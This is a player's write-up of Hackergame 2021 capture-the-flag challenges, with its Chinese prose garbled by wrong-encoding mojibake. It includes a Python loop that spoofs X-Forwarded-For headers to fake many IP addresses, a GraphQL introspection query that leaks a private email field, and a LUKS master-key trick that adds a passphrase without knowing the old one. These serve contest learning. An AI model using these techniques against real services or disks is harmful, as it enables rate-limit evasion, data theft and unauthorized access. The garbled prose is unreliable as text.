# GZTime Writeups

ä¸ºäº†æ›´å¥½çš„é˜…è¯»ä½“éªŒï¼Œè¯·è‡³åšå®¢æŸ¥çœ‹ï¼š[Hackergame 2021 Summary](https://blog.gztime.cc/posts/2021/9f04efbd/)

å…¬å¼åœ¨ GitHub å¤§æ¦‚ç‡æ— æ³•æ˜¾ç¤ºï¼Œå»ºè®®ç§»æ­¥åšå®¢é˜…è¯»ã€‚

ä»£ç æ–‡ä»¶è§ [scripts](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts)

## ç­¾åˆ°

ä»`1970-01-01 08:00 +08:00`å¼€å§‹ï¼Œè‡ªç„¶æƒ³åˆ°äº†è¿™å°±æ˜¯æ—¶é—´æˆ³å•Šï¼Œäºæ˜¯ç›´æ¥æœç´¢æ—¶é—´æˆ³ï¼Œä½œä¸ºè¯·æ±‚å‚æ•°æäº¤ï¼Œå¾—åˆ° flagã€‚

**flag{HappyHacking2021-610073ec3b}**

## è¿›åˆ¶åå…­â€”â€”å‚ä¸Š

ç›´æ¥æŠŠåå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦å³å¯ï¼Œç›¸å…³çš„å·¥å…·å¯è°“æ•°ä¸èƒœæ•°ï¼Œå¯ä»¥ç”¨`Cyberchef`ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥ python...

```py
bytes.fromhex('666c61677b5930555f5348305531445f6b6e30775f4830575f74305f43306e763372745f4845585f746f5f546578547d')
```

**flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT}**

## å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢

å¾ˆæ˜æ˜¾æ˜¯éœ€è¦æˆ‘ä»¬è¿›è¡Œé€Ÿåº¦ä¸Šçš„æ“ä½œäº†ï¼Œæœ€å¼€å§‹æ”¹å˜é€Ÿåº¦ä¹‹åä¾æ—§å¾ˆéš¾å¬æ¸…ï¼Œç›´åˆ°æˆ‘æœ‰ä¸€æ¬¡æ‰‹æ»‘ï¼ŒæŠŠâ€ä¿æŒåŸæœ‰éŸ³è°ƒâ€œçš„é€‰æ‹©å–æ¶ˆå‹¾é€‰äº†ï¼Œæ‰å¾—åˆ°çœŸæ­£çš„æ¸…æ™°çš„éŸ³é¢‘â€¦â€¦orz

<audio src="https://cdn.gztime.cc/hg2021/radio.mp3" controls></audio>

åœ¨ç½‘ä¸Šæœä¸€ä¸‹æ— çº¿ç”µçš„å­—æ¯å¯¹åº”çš„è¯»éŸ³ï¼Œåœ¨éŸ³é¢‘è½¬æ¢æ­£ç¡®çš„æƒ…å†µä¸‹å¾ˆå¿«å°±èƒ½å¾—åˆ° flag äº†ã€‚

**flag{phoneticab}**

## çŒ«å’ªé—®ç­” Pro Max

1. 2017 å¹´ï¼Œä¸­ç§‘å¤§ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨ï¼ˆSEC@USTCï¼‰å¹¶å…¥ä¸­ç§‘å¤§ Linux ç”¨æˆ·åä¼šï¼ˆUSTCLUGï¼‰ã€‚ç›®å‰ï¼Œä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨çš„åŸŸåï¼ˆsec.ustc.edu.cnï¼‰å·²ç»æ— æ³•è®¿é—®ï¼Œä½†ä½ èƒ½æ‰¾åˆ°ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨çš„ç¤¾å›¢ç« ç¨‹åœ¨å“ªä¸€å¤©çš„ä¼šå‘˜ä»£è¡¨å¤§ä¼šä¸Šé€šè¿‡çš„å—ï¼Ÿ

    **Ref:** [https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes](https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes)

    ```
    20150504
    ```

2. ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Linux ç”¨æˆ·åä¼šåœ¨è¿‘äº”å¹´å¤šå°‘æ¬¡è¢«è¯„ä¸ºæ ¡äº”æ˜Ÿçº§ç¤¾å›¢ï¼Ÿ

    **Ref:** [https://lug.ustc.edu.cn/wiki/intro/](https://lug.ustc.edu.cn/wiki/intro/)

    ```
    5
    ```

3. ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Linux ç”¨æˆ·åä¼šä½äºè¥¿åŒºå›¾ä¹¦é¦†çš„æ´»åŠ¨å®¤é—¨å£çš„ç‰Œå­ä¸Šâ€œLUG @ USTCâ€ä¸‹æ–¹çš„å°å­—æ˜¯ï¼Ÿ

    **Ref:** [https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/](https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/)

    ```
    Development Team of Library
    ```

4. åœ¨ SIGBOVIK 2021 çš„ä¸€ç¯‡å…³äºäºŒè¿›åˆ¶ Newcomb-Benford å®šå¾‹çš„è®ºæ–‡ä¸­ï¼Œä½œè€…ä¸€å…±å±•ç¤ºäº†å¤šå°‘ä¸ªæ•°æ®é›†å¯¹å…¶ç†è®ºç»“æœè¿›è¡ŒéªŒè¯ï¼Ÿ

    **Ref:** [http://sigbovik.org/2021/proceedings.pdf](http://sigbovik.org/2021/proceedings.pdf) 210é¡µ

    ```
    13
    ```

5. ä¸ä¸¥æ ¼éµå¾ªåè®®è§„èŒƒçš„æ“ä½œç€å®ä»¤äººç”ŸåŒï¼Œå¥½åœ¨ IETF äº 2021 å¹´æˆç«‹äº† Protocol Police ä»¥ç›‘ç£å¹¶æƒ©æˆ’æ‰€æœ‰è¿èƒŒ RFC æ–‡æ¡£çš„è¡Œä¸ºä¸ªä½“ã€‚å‡å¦‚ä½ å‘ç°äº†æŸä½åŒå­¦å¯èƒ½è¿åäº†åè®®è§„èŒƒï¼Œæ ¹æ® Protocol Police ç›¸å…³æ–‡æ¡£ä¸­è§„å®šçš„ä¸¾æŠ¥æ–¹æ³•ï¼Œä½ åº”è¯¥å°†ä½ çš„ä¸¾æŠ¥ä¿¡å‘å¾€ä½•å¤„ï¼Ÿ

    **Ref:** [https://www.rfc-editor.org/rfc/rfc8962.html](https://www.rfc-editor.org/rfc/rfc8962.html)

    ```
    /dev/null
    ```
**flag{8804d9f3_91d5f62ebd}**

## å–ç“œ

å–ç“œå•Šï¼Œç»™æˆ‘æ¥ä¸ª`2323232323223222332323231`ä¸ªä¹æ–¤çš„ç“œå’Œ`346669`ä¸ªå…­æ–¤çš„ç“œï¼

æ¬¸ï¼Œä½ è¿™ç§°æ€ä¹ˆæˆè´Ÿæ•°äº†ï¼Ÿæˆäº†`-9223372036852695040` æ–¤ï¼

ä¸è¿‡æ›´å¥½äº†ï¼Œå› ä¸ºâ€¦â€¦

`9223372036852695040 + 20 == 1024819115205855006 * 9 + 6`

æ‰€ä»¥ï¼Œç»™æˆ‘å†æ¥`1024819115205855006`ä¸ªä¹æ–¤çš„ç“œå’Œä¸€ä¸ªå…­æ–¤çš„å°±è¡Œäº†ï¼

â€¦â€¦

ä»¥ä¸Šä¾¿æ˜¯è¿™é“é¢˜ç›®ä¼—å¤šçš„è§£æ³•ä¹‹ä¸€ï¼Œä¸€ä¸ªå¾ˆç®€å•çš„æ•´å‹æº¢å‡ºé—®é¢˜ï¼Œé€šè¿‡åŠ ä¸€ä¸ªå¤§æ•´æ•°åˆ°ä¸€ä¸ªå¾ˆå°çš„è´Ÿæ•°ï¼Œå†è¿›è¡Œè¡¥å…¨åˆ°äºŒåï¼Œåˆšå¼€å§‹åšçš„æ—¶å€™ç›´æ¥é£™åˆ°`1e21`çš„å¤§å°å»ï¼Œç›´æ¥å˜æˆæµ®ç‚¹æ•°ï¼Œå°±ç®—æ˜¯å›æ¥äº†ä¾æ—§æ— æ³•é€šè¿‡ã€‚åé¢æ‰ä¸Šäº†é‚£ä¸ªæç¤ºã€‚å¦‚æœä½ è¦è¯´è¿™ä¸ªæ•°å­—æ˜¯æ€ä¹ˆæ¥çš„â€¦â€¦å¾ˆç®€å•â€¦â€¦éšä¾¿è¯•å‡ºæ¥çš„â€¦â€¦

**flag{HUAQIANG!HUAQIANG!_2d21ca2ada}**

## é€æ˜çš„æ–‡ä»¶

ä¹‹å‰åœ¨åš `nc-docker` çš„æ—¶å€™å¸Œæœ›åœ¨ç»ˆç«¯é€šè¿‡ `echo` è¾“å‡ºå¸¦æœ‰é¢œè‰²çš„æ–‡æœ¬ï¼Œäºæ˜¯å­¦ä¹ è¿‡ä¸€äº›åŸºæœ¬çš„æ“ä½œï¼Œæ¯”å¦‚ `echo '\e[32ma'` å°†ä¼šè¾“å‡ºä¸€ä¸ªç»¿è‰²çš„ `a`ï¼Œäºæ˜¯ç±»ä¼¼åœ°ï¼Œå¯¹æ–‡æœ¬ä¸­çš„éƒ¨åˆ†å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œä¹‹åå†åˆ é™¤æœ«å°¾çš„æ¢è¡Œç¬¦å·ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚

å°†ç©ºæ ¼æ›¿æ¢ä¸ºå¯è§å­—ç¬¦ï¼Œä¹‹åæ‰§è¡Œï¼š

`clear && ./transparent.bash`

å°±å¯ä»¥å¾—åˆ°è¿™ä¸€çš„å›¾ç‰‡äº†ï¼š
![](https://cdn.gztime.cc/hg2021/transparent.jpg)

**flag{abxnniohkalmcowsayfiglet}**

## æ—…è¡Œç…§ç‰‡

ä¸€é“æ¯”è¾ƒå¥½ç©åšå‡ºæ¥çš„åŒå­¦ä¹Ÿå¾ˆå¤šçš„ç¤¾å·¥é¢˜ã€‚æˆ–è®¸ä½ å¯ä»¥è¯•ç€è‡ªå·±å†å»å¯»æ‰¾ä¸€ä¸‹ç­”æ¡ˆï¼Œè¯•è¯•ä»€ä¹ˆâ€ç½‘çº¢æ‰“å¡åœ°â€œï¼Œâ€è“è‰² KFCâ€œç­‰ç­‰å…³é”®è¯è¯­ï¼Œå¯ä»¥æ‰¾åˆ°å¤§æ¦‚çš„ä¸€äº›èµ„æ–™ï¼Œå°çº¢ä¹¦æ˜¯ä¸ªä¸é”™çš„æœé›†è¿™ç§ä¿¡æ¯çš„åœ°æ–¹ã€‚

åœ°åä¹Ÿç»™å‡º â€”â€” **ç§¦çš‡å²›æ–°æ¾³æµ·åº•ä¸–ç•Œ**

- **Q1: è¯¥ç…§ç‰‡æ‹æ‘„è€…çš„é¢æœæ–¹å‘ä¸º** ä¸œå—
    æ ¹æ®åœ°å›¾ä¸Šå¯ä»¥æœåˆ°çš„ç›¸å…³ä¿¡æ¯ï¼Œè¿›è¡Œå¯¹æ¯”å¯å¾—ã€‚

- **Q2: è¯¥ç…§ç‰‡çš„æ‹æ‘„æ—¶é—´å¤§è‡´ä¸º** å‚æ™š
    æ ¹æ®å…‰æ¸©ä»¥åŠå½±å­çš„é•¿åº¦ï¼Œå¯ä»¥ç¡®å®šä¸æ˜¯å…¶ä»–é€‰é¡¹ã€‚

- **Q3: è¯¥ç…§ç‰‡çš„æ‹æ‘„è€…æ‰€åœ¨æ¥¼å±‚ä¸º** 14
    åæ­£æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯ 13 æ¥ç€ï¼ˆ

- **Q4: è¯¥ç…§ç‰‡å·¦ä¸Šè§’ KFC åˆ†åº—çš„ç”µè¯å·ç æ˜¯** 0335-7168800
    çŸ¥é“ä½ç½®äº†ä¸€æœä¾¿çŸ¥~

- **Q5: è¯¥ç…§ç‰‡å·¦ä¸Šè§’ KFC åˆ†åº—å·¦ä¾§å»ºç­‘æœ‰ä¸‰ä¸ªæ°´å¹³æ’åˆ—çš„æ±‰å­—ï¼Œå®ƒä»¬æ˜¯** æµ·è±šé¦†
    æœ¬æ¥ä¸€ç›´ä»¥ä¸ºæ˜¯â€æ¸¸æ³³é¦†â€œä¹‹ç±»ï¼Œæ‰¾äº†åŠå¤©ç…§ç‰‡å¶ç„¶å‘ç°æ˜¯â€æµ·è±šé¦†â€œï¼ˆå…¶å®ç›´æ¥æœç´¢å°±èƒ½è·å–åˆ°â€æµ·è±šé¦†è¾¹ä¸Šâ€œè¿™æ¡ä¿¡æ¯çš„ï¼‰


## FLAG åŠ©åŠ›å¤§çº¢åŒ…

ç”±äºé™åˆ¶äº†`/8`åœ°å€åªèƒ½ä¸€æ¬¡ï¼Œåˆç†æ¨æµ‹è¿™ä¸œè¥¿æ˜¯éœ€è¦ 256 æ¬¡åŠ©åŠ›äº†ï¼Œå‰ç«¯çš„ `ip` æ˜¯ç›´æ¥å†™åœ¨ `POST` æ•°æ®é‡Œï¼Œåç«¯çš„ `ip` å‘¢ï¼Ÿ

å¦‚æœç”¨è¿‡åå‘ä»£ç†çš„æˆ–è€…æœ‰æ‰€è€³é—»çš„è¯ï¼Œéƒ½ä¼šç›´åˆ°åœ¨é€šè¿‡åä»£å±‚çš„æ—¶å€™ï¼Œåä»£æœåŠ¡å™¨å¦‚ `nginx` ä¸ºäº†ä½¿å¾—åç«¯åº”ç”¨å¯ä»¥è·å–åˆ°ç”¨æˆ·ç«¯çš„ `ip`ï¼Œä¼šå°†å…¶ä½œä¸º `X-Forwarded-For` è¯·æ±‚å¤´ä¼ å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ç„¶åç›´æ¥åˆ©ç”¨è¿™ä¸€è¯·æ±‚å¤´å®ç° `ip` ä¼ªé€ ã€‚

```py
url = 'http://202.38.93.111:10888/invite/cdba718d-61c2-422f-a7fe-70b7388c299a'

import requests
from hashlib import sha256
from tqdm import tqdm
import time
bar = tqdm(range(256))
for i in bar:
    while True:
        r = requests.post(url, {'ip': f'{i}.0.0.0'},
         headers={'X-Forwarded-For':f'{i}.0.0.0'})
        time.sleep(1)
        if 'æˆåŠŸ' in r.text or 'é‡å¤' in r.text:
            break
    bar.set_description(f'succ {i}' if 'æˆåŠŸ' in r.text else f'fail {i}')
```

**flag{r3d-enve10p3-edcf88e9b1}**

## å›¾ä¹‹ä¸Šçš„ä¿¡æ¯

åœ¨[è¿™é‡Œ](https://graphql.cn/learn/introspection/)ä½ å¯ä»¥çœ‹åˆ°æœ‰å…³äºè¿™ä¸€ API è®¾è®¡å†…çœçš„ç›¸å…³æ–‡æ¡£ã€‚ä»ä¸­å¯çŸ¥ï¼Œä½ å¯ä»¥é€šè¿‡`__schema`å’Œ`__type`ç­‰å­—æ®µè·å–æ”¯æŒçš„è¯·æ±‚ä¿¡æ¯ã€‚

```
POST http://IP:PROT/graphql HTTP/1.1
Connection: keep-alive
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

{"query":"{__schema{types{name}}\n__type(name: \"GUser\"){name\nfields{name}}}"}

HTTP/1.1 200 OK
Server: nginx/1.21.1
Date: Sat, 30 Oct 2021 14:32:44 GMT
Content-Type: application/json
Content-Length: 411
Connection: keep-alive
Vary: Cookie

{"data":{"__schema":{"types":[{"name":"Query"},{"name":"GNote"},{"name":"Int"},{"name":"String"},{"name":"GUser"},{"name":"Boolean"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]},"__type":{"name":"GUser","fields":[{"name":"id"},{"name":"username"},{"name":"privateEmail"}]}}}
```

å†ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“äº†é‚®ç®±çš„å­—æ®µåï¼Œå°±å¯ä»¥ä½¿ç”¨`{user(id: 1){id\nusername\nprivateEmail}}`è¿›è¡Œçº¦æŸå’Œè·å–ç»“æœäº†ã€‚

```json
{
  "data":
  {
    "user":
    {
      "id":1,
      "username":"admin",
      "privateEmail":"flag{dont_let_graphql_l3ak_data_b83ac18e79@hackergame.ustc}"
    }
  }
}
```

**flag{dont_let_graphql_l3ak_data_b83ac18e79@hackergame.ustc}**

## åŠ å¯†çš„ U ç›˜

LUKSåŠ å¯†æ—¶ï¼ŒåŠ è§£å¯†ä½¿ç”¨çš„çœŸæ­£å¯†é’¥å¹¶ä¸æ˜¯ç”¨æˆ·è¾“å…¥çš„å¯†é’¥ï¼Œç”¨æˆ·è¾“å…¥çš„å¯†é’¥åªä¸è¿‡æ˜¯ `passphrase`ï¼Œå®ƒçš„ä½œç”¨æ˜¯è§£å¯†çœŸæ­£çš„å¯†é’¥ `master-key`ã€‚

ç”±äºä¸¤å—æ˜¯åŒä¸€å—ç¡¬ç›˜ï¼Œåº”å½“å…·æœ‰ç›¸åŒçš„ `master-key`ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå°†ç¬¬ä¸€å—ç›˜è§£å¯†æŒ‚è½½ï¼Œè·å– `master-key`ï¼š

```bash
$ sudo cryptsetup luksDump --dump-master-key /dev/loop15p1

LUKS header information for /dev/loop15p1
Cipher name:    aes
Cipher mode:    xts-plain64
Payload offset: 32768
UUID:           e9a660d5-4a91-4dca-bda5-3f6a49eea998
MK bits:        512
MK dump:        be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40
                72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c
                ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82
                60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a
```
å°†`master-key`å­˜å‚¨ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨`xdd`æˆ–è€…`Cyberchef`ã€pythonç­‰å·¥å…·ã€‚

å¦‚æœç›´æ¥ç”¨ `cryptsetup` å¯¹ç¬¬äºŒå¤©çš„æ–‡ä»¶æ“ä½œæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºä»–è¢«æ‰“åŒ…äº†ï¼Œå¯ä»¥å…ˆä½¿ç”¨ `7z -e` è§£å‹ç¼©ï¼Œä¹‹åå†è¿›è¡Œæ“ä½œï¼š

ä¹‹åå°±å¯ä»¥ç›´æ¥æ›´æ”¹å¯†ç äº†ï¼š

```bash
cryptsetup luksAddKey "My Disk.img" --master-key-file <(cat key.bin)
```

å†æ‹–å…¥`ubuntu`ç›´æ¥è¾“å…¥æ–°å¯†ç å°±å¯ä»¥è§£é”æˆåŠŸäº†ã€‚

**Ref:**
1. [how-to-find-the-encrypted-master-key-in-luks-header](https://security.stackexchange.com/questions/241220/how-to-find-the-encrypted-master-key-in-luks-header)
2. [change-password-on-a-luks-filesystem-without-knowing-the-password](https://unix.stackexchange.com/questions/161915/change-password-on-a-luks-filesystem-without-knowing-the-password)

**flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key}**

## å¯†ç ç”Ÿæˆå™¨

è¿™é“é¢˜åˆ†å€¼è¿˜æŒºé«˜çš„ï¼Œä½†å…¶å®æˆ‘è§‰å¾—å½“ä½œä¸€ä¸ª**ä¿¡æ¯æœé›†é¢˜ç›®**ä¹Ÿæœªå°ä¸å¯â€¦â€¦

å¯ä»¥åœ¨ç™»å½•é¡µé¢ä¸‹è½½åˆ°ä¸€ä¸ªå¯†ç ç”Ÿæˆå™¨ï¼Œè¯•å›¾é€†å‘å‘ç°ä¸€è¨€éš¾å°½ï¼Œæ‰€ä»¥åœ¨æƒ³æ—¢ç„¶ä¸€æ¬¡ç”Ÿæˆéƒ½éœ€è¦å‡ ç§’é’Ÿï¼Œé‚£ä¹ˆåˆç†è€ƒè™‘æ˜¯èƒ½å¤Ÿåœ¨æ³¨å†Œæ—¶é—´å‰ä¸€ä¸¤åˆ†é’Ÿä¸€ç›´ç”Ÿæˆå¯†ç è¯•éªŒï¼Œæœ€åè·å–åˆ°ç»“æœçš„ã€‚

![](https://cdn.gztime.cc/hg2021/generatorinfo.jpg)

äºæ˜¯æ›´æ”¹ç³»ç»Ÿæ—¶é—´ï¼Œä»`2021-09-22 23:10`å¼€å§‹å°è¯•ï¼Œå¾ˆå¿«å°±å¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼š`$Z=CBDL7TjHu~mEX`

â€¦â€¦æ‰€ä»¥ä½•å¿…åšé€†å‘å‘¢ï¼ˆé€ƒ

ä¸è¿‡è¯è¯´å›æ¥ï¼Œå®‰å…¨çš„å¯†é’¥ç”Ÿæˆå™¨æ˜¯éœ€è¦è¶³å¤Ÿçš„ç†µçš„ï¼Œæ¯”å¦‚`ssh`ç”Ÿæˆå¯†é’¥çš„æ—¶å€™ä¼šå°†ä½ éšæœºçš„é”®ç›˜è¾“å…¥å’Œé¼ æ ‡è¾“å…¥æ”¶é›†èµ·æ¥ï¼Œä½œä¸ºç†µæ¥ä¸€èµ·è®¡ç®—ç”Ÿæˆä½ çš„å¯†é’¥ã€‚è¿™æ ·æ‰èƒ½ä¿è¯å®‰å…¨ï¼ˆ

**flag{u5e_crypt0graph1ca1ly_secure_PRNG_plz_7486fbe9ef}**

## Easy RSA

å…³äº`RSA`æ˜¯ä»€ä¹ˆï¼Œéœ€è¦å“ªäº›åŸºç¡€çŸ¥è¯†æˆ‘è¿™é‡Œä¸å†èµ˜è¿°ï¼Œæœ‰ç¯‡çŸ¥ä¹çš„æ–‡ç« å†™çš„ä¸é”™ï¼š[RSAç®—æ³•åŸç†](https://zhuanlan.zhihu.com/p/48249182)

æˆ‘ä»¬æ¥çœ‹çœ‹æŒ‡æ•°çš„ç”Ÿæˆè¿‡ç¨‹ï¼š
```py
def get_q():
    value = [getPrime(256)]
    for i in range(1, 10):
        value.append(sympy.nextprime(value[i - 1]))
    print("value[-1] = ", value[-1])
    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967
    n = 1
    for i in range(10):
        n = n * value[i]
    q = getPrime(512)
    value_q = pow(q, e, n)
    print("value_q = ", value_q)
    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819
    return sympy.nextprime(q)
```

`getPrime`å‡½æ•°å¯ä»¥è·å–æŒ‡å®šä½æ•°çš„è´¨æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œéœ€è¦æšä¸¾æ‰¾åˆ°é‚£ä¸ªèµ·å§‹çš„è´¨æ•°ï¼Œä¸å¦¨ä»å·²çŸ¥çš„æœ€åä¸€ä¸ªå¾€å‰å‡å»ä¸€åƒå¼€å§‹å°è¯•ï¼Œæ‰¾åˆ°å½“å‰çš„ä¸ºæ­¢ï¼Œç»è¿‡ä¸€ç•ªæšä¸¾ï¼Œå¯ä»¥å¾—åˆ°æœ€åˆå§‹çš„è´¨æ•°ï¼Œæ”¾å…¥`guess`å¾—åˆ°æˆ‘ä»¬çš„åºåˆ—ä»¥åŠæˆ‘ä»¬çš„`n`:
```py
known = 80096058210213458444437404275177554701604739094679033012396452382975889905967
guess = [80096058210213458444437404275177554701604739094679033012396452382975889905121]

for i in range(1,10):
    guess.append(sympy.nextprime(guess[-1]))

assert(guess[-1] == known)

n = 1
for i in range(10):
    n = n * guess[i]
```

`value_q` æ˜¯ $q ^ e \ mod \ n$ ï¼Œç±»ä¼¼äºRSAçš„æ±‚è§£æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è§£å¯†å¯†é’¥ $d$ åº”å½“æ»¡è¶³

$$ed \equiv 1 (mod \ \phi(n))$$

è€Œ

$$\phi(n) = \prod_{i=1}^{10} (p_i - 1)$$

æ•…è®¡ç®—ï¼š
```py
phi = 1
for i in range(10):
    phi *= guess[i] - 1

d = inverse(e, phi)
print(e * d % phi)
q = pow(value_q, d, n)
```

å¾—åˆ° `q = 10477925992460766451892208516181598312750484426056814542870756188277177949099084361476539803367804757559880919838828678145609717295215924948786830953571811`

å†æ¥çœ‹ `p` çš„æ±‚æ³•ï¼š
```py
def get_p():
    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439
    value_p = sympy.nextprime((math.factorial(y)) % x)
    # Hintï¼šè¿™é‡Œç›´æ¥è®¡ç®—ä¼šæº¢å‡ºï¼Œè¯·ä½ ä»”ç»†è§‚å¯Ÿ x å’Œ y çš„ç‰¹å¾
    return value_p
```

è¿™é‡Œéœ€è¦çŸ¥é“å¨å°”é€Šå®šç†ï¼š

å½“ä¸”ä»…å½“ $p$ ä¸ºè´¨æ•°æ—¶ï¼Œæœ‰ $(p - 1)! \equiv -1(mod \ p)$

å·²çŸ¥ $x,y$ å‡ä¸ºè´¨æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨å¯¼ï¼š

$$
\begin{align*}
(x - 1)!  \equiv& -1 \equiv x - 1 &(mod \ x)\\\\
y!(y + 1)(y + 2) \dots (x - 1) \equiv& x - 1 &(mod \ x) \\\\
y!(y + 1)(y + 2) \dots (x - 2) \equiv& 1 &(mod \ x) \\\\
y! \equiv& [(y + 1)(y + 2) \dots (x - 2)]^{-1} &(mod \ x)
\end{align*}
$$

äºæ˜¯æˆ‘ä»¬çš„é—®é¢˜å°±è½¬åŒ–ä¸ºæ±‚`(y + 1)(y + 2) ... (x - 2)` åœ¨å–å…¶å…³äº`x`çš„é€†å…ƒï¼Œä¹Ÿå³ï¼š
```py
x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439
# cal (y! % x)
prd = 1
for i in range(y + 1,x - 1):
    prd *= i
    prd %= x

p = inverse(prd, x)
p = sympy.nextprime(p)
```
å¾—åˆ° `p = 10569944080090591401315432556965818857327680380269154543273468441025963038065648915158194147019839932524599260058098616377893091051396090650574162446875263`

å†è¿›è¡Œè§£å¯†`c`ï¼š
```py
c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478
phi = (p - 1) * (q - 1)
n = p * q
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

å¾—åˆ°ç­”æ¡ˆã€‚

**flag{CRYPT0_1s_Interesting!}**

## minecRaft

ä»–ä»¬å±…ç„¶çœŸçš„å†™äº†ä¸ªç½‘é¡µç‰ˆMCçš„æ ·å­å‡ºæ¥ï¼ç„¶è€Œå¯¹äºè¿™é“é¢˜æ¥è¯´ï¼ŒMCåªæ˜¯è¡¨é¢çš„ï¼Œæ­£å¦‚æ ‡é¢˜é‡Œå¤§å†™çš„ `R` ä¸€æ ·ï¼Œé‡ç‚¹åœ¨äºé€†å‘å’Œåæ··æ·†ä¸€æ®µ js ä»£ç ã€‚

ä¸€èˆ¬æ¥è¯´æ­¤ç±» js æ··æ·†æ¥è®²ï¼Œæœ€å¥½çš„å…¥æ‰‹ç‚¹å°±æ˜¯é‚£ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä»¥åŠååŠ©è§£ç å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚è·Ÿè¸ªä¿®æ”¹å˜é‡åç§°å¯ä»¥å‘ç°ï¼Œè¿™ä¸€å­—ç¬¦ä¸²æ•°ç»„è¢«åŒ…è£…è¿›äº†å‡½æ•°é‡Œï¼Œå¹¶ä¸”åœ¨å‡ ä¹å…¨éƒ¨çš„åœ°æ–¹éƒ½èƒ½çœ‹åˆ°å®ƒçš„å½±å­ï¼Œçºµä½¿æ¢äº†å¾ˆå¤šå˜é‡åç§°ä¾ç„¶ä¸æ”¹å…¶æœ¬è´¨ã€‚ä»–ä»¬ä¸€èˆ¬ä¼šåœ¨å„ç§éœ€è¦å¸¸é‡çš„åœ°æ–¹å‡ºç°ï¼Œæ¯”å¦‚åœ¨é¢˜ç›®æ‰€ç»™ä»£ç ä¸­çš„å­—ç¬¦ä¸²å¸¸é‡æ•°ç»„ï¼š
```js
function _0x381b() {
  const _0x4af9ee = [
    "encrypt",
    "33MGcQht",
    "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c",
    "14021KbbewD",
    "charCodeAt",
    "808heYYJt",
    "5DlyrGX",
    "552oZzIQH",
    "fromCharCode",
    "356IjESGA",
    "784713mdLTBv",
    "2529060PvKScd",
    "805548mjjthm",
    "844848vFCypf",
    "4bIkkcJ",
    "1356853149054377",
    "length",
    "slice",
    "1720848ZSQDkr",
  ];
  _0x381b = function () {
    return _0x4af9ee;
  };
  return _0x381b();
}
```
ä»¥åŠè·å–å­—ç¬¦ä¸²çš„å‡½æ•°ï¼š
```js
function _0x2c9e(_0x49e6ff, _0x310d40) {
  const _0x381b4c = _0x381b();
  return (
    (_0x2c9e = function (_0x2c9ec6, _0x2ec3bd) {
      _0x2c9ec6 = _0x2c9ec6 - 0x1a6;
      let _0x4769df = _0x381b4c[_0x2c9ec6];
      return _0x4769df;
    }),
    _0x2c9e(_0x49e6ff, _0x310d40)
  );
}
const _0x22517d = _0x2c9e;
```
